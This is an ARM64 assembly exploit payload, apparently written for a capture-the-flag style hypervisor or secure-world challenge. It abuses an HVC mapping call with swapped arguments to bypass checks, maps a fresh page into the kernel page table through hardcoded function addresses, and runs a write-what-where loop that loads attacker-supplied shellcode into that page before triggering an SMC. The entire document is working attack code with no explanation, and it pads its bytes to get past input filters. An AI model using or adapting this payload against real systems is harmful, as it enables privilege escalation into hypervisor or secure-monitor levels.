NOP
NOP
NOP
NOP

// Replace a HVC mapping in the kernel
// Normally map_frame(phy, attr, 0)
// but we swap the arguments to bypass the logic
MOV X0, #1        // hvc_map_frame
MOV X1, #0x4c3    // attributes
MOV X2, #0x100000 // physical addr
MOV X3, XZR       // not used
HVC 0             // map_frame(attr, phy, 0)

// Create a new mapping into our HYP mapping
LDR X22, =0xFFFFFFFFC0008750 // alloc_va
MOV W0, #0
LDR X1, =0xffffffffc001b000  // EL1 kernel page table
LDR X2, =0xffffffffc003a000  // VA - any available page
LDR X3, =0x0060000000000403  // Entry - map at IPA zero
// alloc_va(0, 0xffffffffc001b000, 0xffffffffc003a000, 0x0060000000000403)
BLR X22

NOP // padding

/////////////////////////////////
// Write-what-where program
////////////////////////////////

OFFSET .req X9
BASE .req X10

LDR X22, =0xFFFFFFFFC0009AD8 // read_byte function
LDR BASE, =0xffffffffc003a000  // Target virtual address base
MOV OFFSET, XZR

// padding to avoid banned bytes
NOP
NOP

// Write our shellcode into the new page
.loop:
    BLR X22 // read_byte

    CMP W0, #0x0 // cmd_write
    B.EQ .write
    CMP W0, #0x1 // cmd_seek
    B.EQ .seek
    //CMP W0, #0x2 // cmd_done
    B .done

.write:
    BLR X22 // read_byte
    ADD X1, BASE, OFFSET
    STRB W0, [X1]
    ADD OFFSET, OFFSET, #1
    B .loop

.seek:
    MOV X11, XZR
    BLR X22 // read_byte
    MOV X11, X0
    BLR X22 // read_byte
    LSL X0, X0, #8
    ORR X11, X11, X0
    MOV OFFSET, X11
    B .loop
.done:

// Trigger
SMC 0

NOP
NOP
RET
